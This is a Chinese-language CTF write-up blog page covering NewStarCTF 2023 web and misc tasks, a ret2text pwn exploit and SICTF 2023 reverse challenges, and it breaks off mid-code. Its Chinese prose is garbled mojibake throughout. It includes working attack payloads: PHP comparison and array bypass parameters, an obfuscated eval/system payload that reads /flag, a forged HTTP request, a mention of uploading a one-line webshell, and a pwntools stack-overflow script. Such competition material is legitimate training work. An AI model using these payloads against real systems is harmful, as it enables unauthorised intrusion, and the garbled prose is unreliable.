<h2 id="ç©ºç™½æ ¼"><a href="#ç©ºç™½æ ¼" class="headerlink" title="ç©ºç™½æ ¼"></a>ç©ºç™½æ ¼</h2><p>åœ¨è¿™ç¯‡æ–‡ç« æ‰¾åˆ°äº†è§£å†³æ–¹æ³• </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51999772/article/details/122418926">https://blog.csdn.net/qq_51999772/article/details/122418926</a></p>
<p><a target="_blank" rel="noopener" href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a></p>
<p>è¿è¡Œå¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</span><br></pre></td></tr></table></figure>



<h2 id="éšç§˜çš„çœ¼ç›"><a href="#éšç§˜çš„çœ¼ç›" class="headerlink" title="éšç§˜çš„çœ¼ç›"></a>éšç§˜çš„çœ¼ç›</h2><p>silenteye ä¸‹è½½è¿™ä¸ªå·¥å…·ï¼Œç„¶åè§£å¯†æ‹¿åˆ°flag</p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2018/01/ctfwav.html#SilentEye">https://www.sqlsec.com/2018/01/ctfwav.html#SilentEye</a> </p>
<p><a target="_blank" rel="noopener" href="https://achorein.github.io/silenteye/">https://achorein.github.io/silenteye/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;R0ck1ng_y0u_63b0dc13a591&#125;</span><br></pre></td></tr></table></figure>



<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="æ³„æ¼çš„ç§˜å¯†"><a href="#æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="æ³„æ¼çš„ç§˜å¯†"></a>æ³„æ¼çš„ç§˜å¯†</h2><p>ç”¨dirmap å‘ç°æœ‰ä¸ª<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> å’Œrobot æ‹¼æ¥indexä¸­çš„flagå’Œrobotsçš„flagåå¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>æœ‰æ®µjsçš„ä»£ç æ£€æµ‹ä¸Šä¼ çš„ç±»å‹ï¼Œåœ¨firefoxé‡Œé¢æŠŠjsç¦ç”¨åå°±èƒ½ä¸Šä¼ phpæ–‡ä»¶äº†</p>
<p>ç”¨ä¸€å¥è¯æœ¨é©¬åŠ èšå‰‘åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e9ed8544-e37e-4c4a-ac21-d7cacf157dbf&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /?ctf=1 HTTP/1.1</span><br><span class="line">Host: node4.buuoj.cn:2866</span><br><span class="line">User-Agent: NewStarCTF2023</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line">Origin: newstarctf.com</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: newstarctf.com</span><br><span class="line">Cookie: power=ctfer</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">secret=n3wst4rCTF2023g00000d</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5937a957-5910-4eec-91c3-84e1a8911d97&#125; </span><br></pre></td></tr></table></figure>



<h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/247503.html">https://www.freebuf.com/articles/network/247503.html</a></p>
<p>æ ¹æ®æç¤ºï¼Œç”¨ç©ºå‚æ•°çš„æ—¶å€™flaskå°±æŠ¥é”™äº†ï¼Œå°±æŠŠflagæ³„éœ²å‡ºæ¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://98e6da3a-09a5-40e7-bac4-776d4dd52435.node4.buuoj.cn:81/?number1=1&amp;number2=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = &quot;flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>æŠ¥é”™çš„åœ°æ–¹åœ¨è¿™é‡Œï¼Œç©ºå‚æ•°çš„æ—¶å€™request.args.getä¼šè¿”å›â€™â€™ ç„¶åintè½¬å‹å°±ä¼šæŠ¥é”™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num1 = request.args.get(&quot;number1&quot;);</span><br><span class="line">num2 = request.args.get(&quot;number2&quot;);</span><br><span class="line"></span><br><span class="line">return &quot;not ssti,flag in source code~&quot;+str(int(num1)+int(num2))</span><br></pre></td></tr></table></figure>



<h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>level1ç”¨0eç»•è¿‡ level2ä¼ æ•°ç»„è¿‡å» level3ä¼ æ•°ç»„è¿‡å»ï¼Œlevel4åŠ ä¸€ä¸ªurlç¼–ç is_numbericå°±è¯†åˆ«ä¸å‡ºæ¥äº†ï¼Œlevel5ä¼ ä¸€ä¸ªç¬¦å·å°±å¥½äº†</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46145027/article/details/124514124">https://blog.csdn.net/qq_46145027/article/details/124514124</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/12342124.html">https://www.cnblogs.com/zhengna/p/12342124.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Primzahl/p/6018158.html">https://www.cnblogs.com/Primzahl/p/6018158.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://34cb9ad6-2b68-4fd9-a2fc-9a6698c8b0c5.node4.buuoj.cn:81/?key1=QNKCDZO&amp;key2=s878926199a&amp;key4[]=1&amp;key5=2024%20</span><br><span class="line"></span><br><span class="line">post: key3[]=@&amp;flag5[]=@</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3a48262b-ac99-4f09-85ed-9ac23cec050e&#125;</span><br></pre></td></tr></table></figure>



<h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><p>passwordçˆ†ç ´è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">TARGET_PREFIX = <span class="string">&quot;c4d038&quot;</span></span><br><span class="line">MAX_LENGTH = <span class="number">6</span></span><br><span class="line">CHARSET = string.ascii_lowercase + string.digits</span><br><span class="line">THREADS = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_strings</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="keyword">return</span> itertools.product(CHARSET, repeat=length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_string</span>(<span class="params">start, end</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> itertools.islice(generate_strings(MAX_LENGTH), start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(<span class="string">&#x27;&#x27;</span>.join(s)).startswith(TARGET_PREFIX):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(s)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threaded_bruteforce</span>():</span><br><span class="line">    total_combinations = <span class="built_in">len</span>(CHARSET) ** MAX_LENGTH</span><br><span class="line">    step = total_combinations // THREADS</span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(THREADS):</span><br><span class="line">        start = i * step</span><br><span class="line">        end = (i + <span class="number">1</span>) * step <span class="keyword">if</span> i != THREADS - <span class="number">1</span> <span class="keyword">else</span> total_combinations</span><br><span class="line">        t = threading.Thread(target=check_string, args=(start, end))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># threaded_bruteforce()</span></span><br><span class="line">    <span class="built_in">print</span>(md5(<span class="string">&quot;apofox&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>éæ³•å˜é‡åçš„è½¬æ¢ <a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16804708.html">https://www.cnblogs.com/meng-han/p/16804708.html</a></p>
<p>phpinfoå‘ç°å¯ä»¥ç”¨æ‹¼æ¥å‡½æ•°çš„æ–¹å¼ç»•è¿‡ <a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/117469219">https://blog.csdn.net/LYJ20010728/article/details/117469219</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=apofox&amp;e[v.a.l=(sy.(st).em)(&quot;ca&quot;.&quot;t /fla&quot;.&quot;g&quot;);</span><br></pre></td></tr></table></figure>



<h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p>æ³¨å†Œä¸ªè´¦æˆ·åç™»å½•æ—¶å€™æœ‰ä¸ª302çš„åŒ…æ˜¾ç¤ºè¿™ä¸ªï¼Œè¿™ä¸ªæ˜¯ä¸ªå‡çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- æ­å–œä½ æ‰¾åˆ°flag --&gt;</span><br><span class="line">&lt;!-- flag ä¸ºä¸‹æ–¹é“¾æ¥ä¸­è§†é¢‘ç®€ä»‹ç¬¬7è¡Œå¼€å§‹è‡³ç¬¬10è¡Œçš„å…¨éƒ¨å°å†™å­—æ¯å’Œæ•°å­— --&gt;</span><br><span class="line">&lt;!-- https://b23.tv/BV1SD4y1J7uY --&gt;</span><br><span class="line">&lt;!-- åº†ç¥ä¸€ä¸‹å§ï¼ --&gt;</span><br></pre></td></tr></table></figure>

<p>åé¢å°è¯•å»çˆ†ç ´admin,ç”¨burpä¸­çš„brute forcerç„¶åå¥—md5çˆ†ç ´ï¼Œçˆ†ç ´å‡ºæ¥çš„å¯†ç æ˜¯000000ï¼Œç„¶åæœ‰ä¸ª302çš„åŒ…é‡Œé¢æœ‰flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3e7dd426-5475-4789-9605-b1fac334af0f&#125;</span><br></pre></td></tr></table></figure>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><span class="leancloud_visitors"></span><span>About 4285 words, 14 min 17 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/">expæœ¬åœ°ä¸é€šè¿œç¨‹é€šçš„é—®é¢˜</a></h3></div><div class="post-content"><div class="card"><p><p>ä»Šå¤©çœ‹ä¸€ä¸ªret2textçš„é¢˜ç›®çš„æ—¶å€™ï¼Œé‡åˆ°äº†expæœ¬åœ°ä¸é€šï¼Œè¿œç¨‹é€šçš„å¥‡æ€ªé—®é¢˜ï¼Œé¢˜ç›®æ˜¯è¿™æ ·çš„</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663341172.png" class="" title="uTools_1695663341172">

<p>æœ‰ä¸ªbackdoorå‡½æ•°æ˜¯è¿™æ ·çš„</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663362912.png" class="" title="uTools_1695663362912">

<p>expæ˜¯è¿™æ ·çš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=remote(&quot;1.container.jingsai.apicon.cn&quot;,30509)</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./Intruduce&#x27;</span>)</span><br><span class="line">p = process()</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>* (<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">backd00r=<span class="number">0x4011B6</span></span><br><span class="line">payload+=p64(backd00r)</span><br><span class="line">s=p.recvline() ; <span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">char=p.recv(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(char)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>gdbè°ƒè¯•äº†ä¸€ä¸‹å‘ç°åœ¨call systemçš„æ—¶å€™å¡åœ¨äº†è¿™ä¸ªxmmå¯„å­˜å™¨é‡Œ</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663133026.png" class="" title="uTools_1695663133026">

<p>æœç´¢äº†ä¸€ä¸‹ï¼Œåœ¨è¿™é‡Œæ‰¾åˆ°äº†è§£å†³æ–¹æ³• <a target="_blank" rel="noopener" href="https://blog.csdn.net/fjh1997/article/details/107695261">https://blog.csdn.net/fjh1997/article/details/107695261</a></p>
<p>å‘ç°æ˜¯glibc &gt;&#x3D; 2.27çš„æ—¶å€™ systemå‡½æ•°é‡Œé¢ä¼šè°ƒç”¨xmmå¯„å­˜å™¨ï¼Œxmmå¯„å­˜å™¨è¦æ±‚16å­—èŠ‚å¯¹é½ï¼Œè¿œç¨‹çš„ç¯å¢ƒåº”è¯¥æ˜¯&lt;2.27çš„æ‰€ä»¥å¯ä»¥ç›´æ¥æ‰“é€šï¼Œç„¶åæˆ‘æœ¬åœ°çš„glibcç‰ˆæœ¬æ˜¯2.35çš„ï¼Œæ‰€ä»¥ä¼šå› ä¸ºxmmå¯„å­˜å™¨å†…å­˜å¯¹é½çš„åŸå› å¯¼è‡´expæ‰“ä¸é€šï¼Œåªéœ€è¦å°‘pushä¸€ä¸ªåœ°å€ï¼Œå†…å­˜å°±å¯¹é½äº†</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695665501265.png" class="" title="uTools_1695665501265">

<p>ä¸€å¼€å§‹æˆ‘æ˜¯ç”¨4011B6è¿™ä¸ªåœ°å€ï¼Œåé¢æ¢æˆäº†4011BBå°±å¯¹é½äº†ï¼Œç„¶åæœ¬åœ°å°±é€šäº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=remote(&quot;1.container.jingsai.apicon.cn&quot;,30509)</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./Intruduce&#x27;</span>)</span><br><span class="line">p = process()</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>* (<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">backd00r=<span class="number">0x4011BB</span> <span class="comment"># old address 4011B6</span></span><br><span class="line">payload+=p64(backd00r)</span><br><span class="line">s=p.recvline() ; <span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">char=p.recv(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(char)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-26</span><span class="leancloud_visitors"></span><span>About 348 words, 1 min 9 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/18/sictf2023r2/">sictf2023</a></h3></div><div class="post-content"><div class="card"><p><h3 id="é™„ä»¶-https-github-com-nyyyddddn-ctf-tree-main-Sictf2023-20-23Round-202"><a href="#é™„ä»¶-https-github-com-nyyyddddn-ctf-tree-main-Sictf2023-20-23Round-202" class="headerlink" title="é™„ä»¶ https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202"></a>é™„ä»¶ <a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202">https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202</a></h3><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ç­¾åˆ°-PYC"><a href="#ç­¾åˆ°-PYC" class="headerlink" title="[ç­¾åˆ°]PYC"></a>[ç­¾åˆ°]PYC</h2><p>ç”µè„‘ä¸Šçš„pycdcå‡ºé—®é¢˜äº†ï¼Œå°±æ‰¾ä¸ªåœ¨çº¿çš„</p>
<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/string/pyc-compile-decompile">https://www.lddgo.net/string/pyc-compile-decompile</a></p>
<p>print(â€˜SICTF{07e278e7-9d66-4d90-88fc-8bd61e490616}â€™)</p>
<h2 id="Myobject"><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h2><p>rc4åŠ è§£å¯†ï¼Œå†™ä¸ªè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]  <span class="comment"># Swap values</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> plaintext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]  </span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        output.append(byte ^ K)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line">key = [<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&quot;SIFLAG&quot;</span>]</span><br><span class="line">v18_bytes = (<span class="number">0x47CF225A0ED32730</span>).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">ciphertext_v19 = [<span class="number">71</span>, <span class="number">107</span>, <span class="number">11</span>, <span class="number">229</span>, <span class="number">141</span>, <span class="number">83</span>, <span class="number">186</span>, <span class="number">153</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">7</span>]</span><br><span class="line">v20_bytes = (<span class="number">0x9F88FE10771C0107</span>).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">full_ciphertext_27 = <span class="built_in">list</span>(v18_bytes) + ciphertext_v19 + <span class="built_in">list</span>(v20_bytes)</span><br><span class="line"></span><br><span class="line">decrypted_full_combined = rc4(key, full_ciphertext_27)</span><br><span class="line">decrypted_full_combined_string = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> decrypted_full_combined])</span><br><span class="line"><span class="built_in">print</span>(decrypted_full_combined_string)</span><br></pre></td></tr></table></figure>

<p>SICTF{wow_you_get_the_flag}</p>
<h2 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">strcpy(Str2, <span class="string">&quot;F0lWEVA7BmUzAGB0C2UuAU9hbnIpATEidDdnACQ9&quot;</span>);</span><br><span class="line"></span><br><span class="line">char *sub_411B30()</span><br><span class="line">&#123;</span><br><span class="line">  char *result; // eax</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41C0F5);</span><br><span class="line">  j_strcpy(&amp;Destination, <span class="string">&quot;ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  result = (char *)IsDebuggerPresent();</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> j_strcpy(&amp;Destination, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>base64æ¢ä¸€ä¸‹ä¸Šé¢çš„ç´¢å¼•è¡¨å°±è§£å‡ºæ¥äº†</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a></p>
<p>SICTF{base64_and_antidebugger}</p>
<h2 id="ä¸ä¸€æ ·çš„base64"><a href="#ä¸ä¸€æ ·çš„base64" class="headerlink" title="ä¸ä¸€æ ·çš„base64"></a>ä¸ä¸€æ ·çš„base64</h2><p>è¿™ä¸ªå‡ºé¢˜äººæ€ä¹ˆå¯¹base64æƒ…æœ‰ç‹¬é’Ÿ</p>
<p>pyinstalleræ‰“åŒ…çš„exe,æˆ‘æ‰¾äº†å‡ ä¸ªæå–pycçš„é¡¹ç›®ï¼Œå°±è¿™ä¸ªæ¯”è¾ƒå¥½ç”¨</p>
<p><a target="_blank" rel="noopener" href="https://github.com/pyinstxtractor/pyinstxtractor-ng/releases/tag/2023.08.20">https://github.com/pyinstxtractor/pyinstxtractor-ng/releases/tag/2023.08.20</a></p>
<p>ç„¶åæŠŠ111.pyc åç¼–è¯‘ä¸€ä¸‹</p>
<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/string/pyc-compile-decompile">https://www.lddgo.net/string/pyc-compile-decompile</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.8</span></span><br><span class="line"></span><br><span class="line">BASE64_CHARS = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">data</span>):</span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join((<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">for</span> x <span class="keyword">in</span> <span class="number">.0</span>:</span><br><span class="line"><span class="built_in">format</span>(x, <span 